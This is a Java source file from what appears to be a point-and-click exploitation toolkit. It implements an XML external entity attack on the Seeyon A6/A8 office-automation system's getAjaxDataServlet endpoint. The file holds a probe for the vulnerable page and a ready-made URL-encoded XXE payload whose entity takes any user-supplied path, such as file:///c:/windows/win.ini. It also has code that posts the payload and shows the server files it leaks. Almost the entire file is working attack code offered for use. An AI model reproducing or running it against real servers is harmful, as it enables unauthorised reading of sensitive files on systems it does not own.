package exp.oa.seeyonoa.A6_8;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import org.apache.commons.lang3.StringEscapeUtils;
import utils.HttpTools;
import utils.Response;
import decrypt.code.getAllEncode;

import java.util.HashMap;

public class seeyon_A6A8_getAjaxDataServlet_xxe implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞已直接执行系统命令，无需getshell");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd, textArea,textArea_cmd);
//        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try {
            HashMap<String, String> head = new HashMap<>();
            Response res = HttpTools.get(url + "/seeyon/m-signature/RunSignature/run/getAjaxDataServlet" , head, "utf-8");
            if (res.getCode() == 200 && res.getText().contains("提示信息")) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ seeyon_A6A8_getAjaxDataServlet_xxe ]");
                    textArea.appendText("\n 漏洞页面存在，请构造xxe实体");
                    textArea.appendText("\n eg: file:///c:/windows/win.ini");
                    textArea.appendText("\n");
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private static String getAjaxDataXXE(String url,String xxe){
        try {
            HashMap<String, String> head = new HashMap<>();
            String var = "S=ajaxColManager&M=colDelLock&imgvalue=lr7V9+0XCEhZ5KUijesavRASMmpz%2FJcFgNqW4G2x63IPfOy%3DYudDQ1bnHT8BLtwokmb%2Fk&signwidth=4.0&signheight=4.0&xmlValue=";
            String var2 = "%3C%3Fxml+version%3D%221.0%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%0D%0A++%3C%21ELEMENT+foo+ANY+%3E%0D%0A++%3C%21ENTITY+xxe+SYSTEM+%22"+getAllEncode.getAllUrlEncode(xxe,"")+"%22+%3E%0D%0A%5D%3E%0D%0A%3CSignature%3E%3CField%3E%3Ca+Index%3D%22ProtectItem%22%3Etrue%3C%2Fa%3E%3Cb+Index%3D%22Caption%22%3Ecaption%3C%2Fb%3E%3Cc+Index%3D%22ID%22%3Eid%3C%2Fc%3E%3Cd+Index%3D%22VALUE%22%3E%26xxe%3B%3C%2Fd%3E%3C%2FField%3E%3C%2FSignature%3E";
            String var3 = var+ var2;
            Response res = HttpTools.post(url + "/seeyon/m-signature/RunSignature/run/getAjaxDataServlet",var3, head, "utf-8");
            if(res.getCode()==200 && res.getText().contains("localhost.log")){
                return StringEscapeUtils.unescapeHtml4(res.getText());
            }
        }catch (Exception E){
            return null;
        }
        return null;
    }

    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {

        try {
            String var = getAjaxDataXXE(url,cmd);
            if (var != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行成功！");
                    textArea_cmd.appendText("\n"+var);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行失败！");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
